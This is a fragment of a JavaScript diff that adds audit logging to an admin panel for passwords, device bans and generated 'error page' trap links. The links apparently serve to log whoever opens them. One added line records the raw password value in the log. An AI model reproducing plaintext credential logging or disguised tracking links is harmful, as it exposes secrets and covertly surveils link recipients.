     fetch(devPasswordsUrl(),{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(arr)})
       .then(function(r){if(!r.ok)throw new Error('HTTP '+r.status);return r.json();})
-      .then(function(){inp.value='';loadOpPasswords();})
+      .then(function(){exLog('Password added',val,'operator');inp.value='';loadOpPasswords();})
       .catch(function(e){alert('Failed: '+e.message);});
   });
 });
@@ -703,14 +1051,15 @@ function loadOpBans(){
       btn.addEventListener('click',function(){
         var idx=parseInt(btn.getAttribute('data-unban'));
         var a=arr.slice();a.splice(idx,1);
-        syncFetch(devBansUrl(),{method:'PUT',body:JSON.stringify(a)}).then(function(){loadOpBans();}).catch(function(e){alert('Failed: '+e.message);});
+        var tagToUnban=arr[idx];
+        syncFetch(devBansUrl(),{method:'PUT',body:JSON.stringify(a)}).then(function(){exLog('Device unbanned','Tag: '+tagToUnban,'operator');loadOpBans();}).catch(function(e){alert('Failed: '+e.message);});
       });
     });
   });
 }
 document.getElementById('opBanClear').addEventListener('click',function(){
   if(!confirm('Clear all bans?'))return;
-  syncFetch(devBansUrl(),{method:'DELETE'}).then(function(){loadOpBans();}).catch(function(e){alert('Failed: '+e.message);});
+  syncFetch(devBansUrl(),{method:'DELETE'}).then(function(){exLog('All bans cleared','','operator');loadOpBans();}).catch(function(e){alert('Failed: '+e.message);});
 });
 document.getElementById('opBanFromLog').addEventListener('click',function(){
   var picker=document.getElementById('opBanPicker');
@@ -736,7 +1085,7 @@ document.getElementById('opBanFromLog').addEventListener('click',function(){
           var a=Array.isArray(d)?d:[];
           if(a.indexOf(tag)===-1)a.push(tag);
           return syncFetch(devBansUrl(),{method:'PUT',body:JSON.stringify(a)});
-        }).then(function(){picker.style.display='none';loadOpBans();}).catch(function(e){alert('Failed: '+e.message);});
+        }).then(function(){exLog('Device banned','Tag: '+tag,'operator');picker.style.display='none';loadOpBans();}).catch(function(e){alert('Failed: '+e.message);});
       });
     });
   });
@@ -765,13 +1114,13 @@ function refreshOpTrapLinksStatus(){
 }
 document.getElementById('opTrapToggleGen').addEventListener('click',function(){
   trapGenEnabled(function(enabled){
-    syncFetch(trapGenEnabledUrl(),{method:'PUT',body:JSON.stringify(!enabled)}).then(function(){refreshOpTrapGenStatus();}).catch(function(e){alert('Failed: '+e.message);});
+    syncFetch(trapGenEnabledUrl(),{method:'PUT',body:JSON.stringify(!enabled)}).then(function(){exLog('Link generation '+(enabled?'disabled':'enabled'),'','operator');refreshOpTrapGenStatus();}).catch(function(e){alert('Failed: '+e.message);});
   });
 });
 document.getElementById('opTrapToggleLinks').addEventListener('click',function(){
   fetch(trapLinksEnabledUrl()).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(v){
     var on=v!==false;
-    syncFetch(trapLinksEnabledUrl(),{method:'PUT',body:JSON.stringify(!on)}).then(function(){refreshOpTrapLinksStatus();}).catch(function(e){alert('Failed: '+e.message);});
+    syncFetch(trapLinksEnabledUrl(),{method:'PUT',body:JSON.stringify(!on)}).then(function(){exLog('Error links '+(on?'disabled':'enabled'),'','operator');refreshOpTrapLinksStatus();}).catch(function(e){alert('Failed: '+e.message);});
   });
 });
 document.getElementById('opTrapRefresh').addEventListener('click',function(){loadOpTrapList();});
@@ -780,7 +1129,7 @@ document.getElementById('opTrapClearAll').addEventListener('click',function(){
   Promise.all([
     fetch(trapLinksUrl(),{method:'DELETE'}),
     fetch(trapLogsUrl(),{method:'DELETE'})
-  ]).then(function(){loadOpTrapList();}).catch(function(e){alert('Failed: '+e.message);});
+  ]).then(function(){exLog('All error links deleted','','operator');loadOpTrapList();}).catch(function(e){alert('Failed: '+e.message);});
 });
 
 function loadOpTrapList(){
@@ -845,7 +1194,7 @@ function loadOpTrapList(){
         Promise.all([
           fetch(fbUrl('_sc6/trapLinks/'+id),{method:'DELETE'}),
           fetch(trapLogsUrl(id),{method:'DELETE'})
-        ]).then(function(){loadOpTrapList();}).catch(function(e){alert('Failed: '+e.message);});
+        ]).then(function(){exLog('Error link deleted','ID: '+id,'operator');loadOpTrapList();}).catch(function(e){alert('Failed: '+e.message);});
       });
     });
   });
@@ -927,13 +1276,17 @@ document.getElementById('devTrapGen').addEventListener('click',function(){
     var id=Math.random().toString(36).slice(2,8)+Math.random().toString(36).slice(2,8);
     var entry={createdAt:new Date().toISOString(),createdBy:deviceTag()};
     syncFetch(fbUrl('_sc6/trapLinks/'+id),{method:'PUT',body:JSON.stringify(entry)}).then(function(){
-      loadDevTrapList();
       var url=ERROR_PAGE_BASE+'?id='+encodeURIComponent(id);
+      exLog('Error link generated','ID: '+id+' | Code: '+_currentDevCode,'dev '+_currentDevCode);
+      loadDevTrapList();
       navigator.clipboard.writeText(url).catch(function(){});
       alert('Link generated:\n'+url);
     }).catch(function(e){alert('Failed: '+e.message);});
   });
 });
+
+// Pre-load nicknames silently so exec log render has them ready
+loadNicknames(null);
 
 })();
 
